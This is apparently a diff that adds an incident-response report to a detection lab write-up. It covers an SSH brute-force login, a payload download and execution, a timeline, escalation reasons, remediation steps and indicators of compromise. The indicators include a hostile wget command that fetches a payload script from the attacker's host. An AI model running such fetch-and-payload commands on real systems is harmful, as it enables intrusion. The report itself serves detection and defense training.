@@ -220,3 +220,72 @@ Only triggers when multiple attack stages occur.
 | Execution      | Command Execution            | T1059  |
 | Persistence    | File Creation                | T1105  |
 | C2             | Application Layer Protocol   | T1071  |
+
+
+
+## Incident Timeline
+
+| Time       | Event Description                                  |
+|-------------|----------------------------------------------------|
+| 22:28:06    | Multiple failed SSH login attempts detected        |
+| 22:28:15    | Successful login from attacker IP                  |
+| 22:51:55    | Payload downloaded via wget                        |
+| 22:52:12    | Payload executed                                   |
+| 22:52:12    | File `/tmp/malware.txt` created                    |
+| 22:52:12    | External connection attempt to example.com         |
+
+
+# True Positive Report
+
+**Time of activity:**  
+2026-03-30 ~22:28:06 to 22:52:12  
+
+---
+
+## List of Affected Entities
+- **Victim Host:** Ubuntu Server (ubuntu11)  
+- **Attacker IP:** 192.168.1.64  
+- **Services Affected:** SSH (port 22), HTTP (port 8000)  
+- **Log Sources:** auth.log, syslog, apache access.log  
+
+---
+
+## Reason for Classifying as True Positive
+- Multiple failed SSH login attempts followed by successful authentication from the same IP  
+- Confirmed payload download using wget  
+- Verified execution of payload on the victim system  
+- File creation (/tmp/malware.txt) observed  
+- External communication attempt detected  
+- Indicates a complete attack chain from initial access to execution  
+
+---
+
+## Reason for Escalating the Alert
+- Unauthorized access to system achieved  
+- Execution of potentially malicious script  
+- Evidence of system modification (file creation)  
+- Attempted outbound communication (possible C2 behavior)  
+- Multi-stage attack observed within short time window  
+- High confidence malicious activity requiring immediate attention  
+
+---
+
+## Recommended Remediation Actions
+- Disable password-based SSH authentication (use key-based auth)  
+- Implement account lockout or rate limiting for SSH  
+- Block attacker IP (192.168.1.64) at firewall level  
+- Remove malicious files (/tmp/malware.txt, /tmp/payload.sh)  
+- Audit user accounts and reset compromised credentials  
+- Restrict outbound internet access from critical servers  
+- Enable EDR or endpoint monitoring for process visibility  
+
+---
+
+## List of Attack Indicators
+- **Source IP:** 192.168.1.64  
+- **Failed SSH logins:** "Failed password"  
+- **Successful login:** "Accepted password"  
+- **Command execution:** `wget http://192.168.1.64:8000/payload.sh`  
+- **File created:** /tmp/malware.txt  
+- **Payload file:** /tmp/payload.sh  
+- **External domain attempt:** example.com  
